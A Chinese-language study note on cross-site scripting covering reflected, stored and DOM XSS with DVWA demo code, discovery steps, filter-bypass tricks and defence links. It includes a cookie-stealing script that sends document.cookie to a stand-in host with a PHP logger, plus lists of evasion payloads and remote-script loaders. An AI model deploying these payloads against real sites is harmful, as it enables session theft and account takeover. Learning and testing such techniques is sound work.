---
typora-copy-images-to: ../images
typora-root-url: ..
---

## XSS学习笔记

如题



### XSS概述

 跨站脚本攻击—XSS（Cross Site Script），是指攻击者通过在Web页面中写入恶意脚本，造成用户在浏览页面时，控制用户浏览器进行操作的攻击方式。假设，在一个服务端上，有一处功能使用了这段代码，他的功能是将用户输入的内容输出到页面上，很常见的一个功能。但是假如，这里输入的内容是一段经过构造的js。那么在用户再次访问这个页面时，就会获取使用js在用户的浏览器端执行一个弹窗操作。通过构造其他相应的代码，攻击者可以执行更具危害的操作。 



### XSS原理

#### 反射型XSS

反射型XSS也叫非持久型XSS，最常见的就是在URL中构造，将恶意连接发送给目标用户。当用户访问该链接时，会向服务器发起一个GET请求来提交带有恶意代码的链接。

DVWA中的demo:

```php
<?php

if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){
 	$isempty = true;
} else {       
 	echo '<pre>';
 	echo 'Hello ' . $_GET['name'];
 	echo '</pre>';
    
}
```



#### 存储型XSS

存储型XSS也叫持久型XSS，常见存在与博客的留言板、反馈投诉、论坛评论等地方，它会将恶意代码和正文都存储进服务器。用户每次访问页面都会触发恶意代码。

demo:

```php
<?php

if(isset($_POST['btnSign']))
{

   $message = trim($_POST['mtxMessage']);
   $name    = trim($_POST['txtName']);
   
   // Sanitize message input
   $message = stripslashes($message);
   $message = mysql_real_escape_string($message);
   
   // Sanitize name input
   $name = mysql_real_escape_string($name);
  
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
   
   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );
   
}

?>
```



#### DOM型XSS

DOM型XSS也是反射型的一种，不过比较特殊。它不会和服务器发生交互，它通过修改页面的DOM节点来形成XSS漏洞。我们可以通js脚本DOM进行编辑从而修改页面的元素。也就是说，客户端的脚本可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。

demo:

```javascript
<script> 
    var img=document.createElement("img");
	img.src="http://demo.com/cookie?"+escape(document.cookie);
</script>
```



### XSS危害

* Cookie盗取

  服务器端脚本：

  ```php
  #http://demo.com/xss_cookie.php
  <?php
      $cookie = $_GET['cookie'];
  	$log = fopen("cookie.txt","a");
  	fwrite($log, $cookie."\n")
      fclose($log);
  ?>
  ```

  在存在XSS漏洞的地方插入下面的代码:

  ```javascript
  <script>
  var img = document.createElement("img");
  img.src = "http://demo.com/xss_cookie.php?cookie="+escape(document.cookie);
  </script>
  ```

* 钓鱼（伪造登录框页面）

* 获取内网IP段

  参考这篇文章 https://toutiao.io/posts/8urlis/preview 

* 站点重定向

* 获取客户端页面信息

* XSS蠕虫



### 漏洞挖掘

#### 基本思路

漏洞挖掘的方法大致可以分成两类：

* 人工挖掘
* 利用工具自动化挖掘

利用工具自动化挖掘本质就是将人工挖掘的流程自动化，流程还是差不多的。

一般流程：

1. 寻找数据入口
2. 潜在注入点检测
3. 生成payload
4. payload攻击验证



寻找数据入口就是寻找WEB页面上的输入和输出口。例如网站输入框、URL参数，评论、留言版、或者Header头部里的UA/Referer/Cookie等。潜在注入点检测就是判断输入点是否可以成功将数据注入到页面。生成payload就是不断测试去调整payload，用payload进行不断的fuzz。当payload成功注入时，就意味着XSS注入成功了。



#### 常用的探测向量

```javascript
<script>alert(1)</script>
<script>confirm(1)</script>
<img src=x onerror=prompt(1);>
<svg/onload=prompt(1);>
<audio src=x onerror=prompt(1);>
```

#### Awesome payloads

```javascript
<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
<d3"<"/onclick="1>[confirm``]"<">z
<d3/onmouseenter=[2].find(confirm)>z
<details open ontoggle=confirm()>
<script y="><">/*<script* */prompt()</script
<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
<a href="javascript%26colon;alert(1)">click
<a href=javas&#99;ript:alert(1)>click
<script/"<a"/src=data:=".<a,[8].some(confirm)>
<svg/x=">"/onload=confirm()//
<--`<img/src=` onerror=confirm``> --!>
<svg%0Aonload=%09((pro\u006dpt))()//
<sCript x>(((confirm)))``</scRipt x>
<svg </onload ="1> (_=prompt,_(1)) "">
<!--><script src=//14.rs>
<embed src=//14.rs>
<script x=">" src=//15.rs></script>
<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
<iframe/src \/\/onload = prompt(1)
<x oncut=alert()>x
<svg onload=write()>
```



一些速查表：

* [Cross-site scripting (XSS) cheat sheet]( https://portswigger.net/web-security/cross-site-scripting/cheat-sheet )
* [xss-payload-list]( https://github.com/payloadbox/xss-payload-list )
* [XSS Filter Evasion Cheat Sheet]( https://owasp.org/www-community/xss-filter-evasion-cheatsheet )



#### Awesome XSS Polyglot

XSS Polyglot也可以说是XSS通用攻击payload吧，它由不同语言的元素构成，能注入多种不同的上下文。

一个例子：from: https://github.com/s0md3v/AwesomeXSS#awesome-polyglots 

```javascript
%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
```

解释：



![image-20210525103527972](/images/image-20210525103527972.png)

#### 常见的绕过方法

* 闭合标签：` “><script>alert(1);</script>`
* 利用html标签的属性值：`<img src="javascript:alert(1);">`
* 空格/tab/回车:`<img src="java    script:alert(1);" >`
* 字符编码：`%c1;alert(1);//`
* 圆括号过滤：`<a onmouseover="javascript:window.onerror=alert;throw 1">`
* 实体解码
* 使用 十六进制、八进制、Unicode、HTML等进行编码
* Alert被过滤：使用prompt和confirm代替



### 漏洞防御

参照： https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html 





最后推荐两个xss闯关网址：

*  http://xss-quiz.int21h.jp/ 
*  https://www.xssgame.com/m4KKGHi2rVUN 

等我有空就去玩一下

### REFERENCE

*  https://github.com/s0md3v/AwesomeXSS 
*  https://github.com/hongriSec/Web-Security-Attack/blob/master/Part1/Day2/files/README.md 
*  https://github.com/payloadbox/xss-payload-list 
*  https://owasp.org/www-community/xss-filter-evasion-cheatsheet 
*  https://thief.one/2017/05/31/1/ 
*  https://zhuanlan.zhihu.com/p/26086290 
*  https://www.jianshu.com/p/13f0b9a15e46 